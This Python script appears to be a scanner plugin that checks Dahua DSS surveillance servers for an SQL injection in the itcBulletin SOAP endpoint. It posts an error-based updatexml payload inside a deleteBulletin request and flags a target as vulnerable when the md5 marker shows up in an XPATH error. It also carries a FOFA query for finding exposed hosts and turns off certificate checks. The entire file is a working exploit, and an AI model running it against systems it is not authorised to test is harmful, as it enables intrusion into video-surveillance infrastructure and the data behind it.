#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/UAbV1DuKKNNzAQXuCAcwVQ',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '大华DSS Digital Surveillance System系统itcBulletin接口SQL注入',

      'level'     :   'high',

      'FOFA'      :   'app="dahua-DSS"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/12',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/portal/services/itcBulletin?wsdl'
  body = '''
<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
  <s11:Body>
    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
      <netMarkings>
        (updatexml(1,concat(0x7e,md5(1),0x7e),1))) and (1=1
      </netMarkings>
    </ns1:deleteBulletin>
  </s11:Body>
</s11:Envelope>
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=body,timeout=5,verify=False)
    if res.status_code == 500 and re.search(r'XPATH syntax error.*?c4ca4238a0b923',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret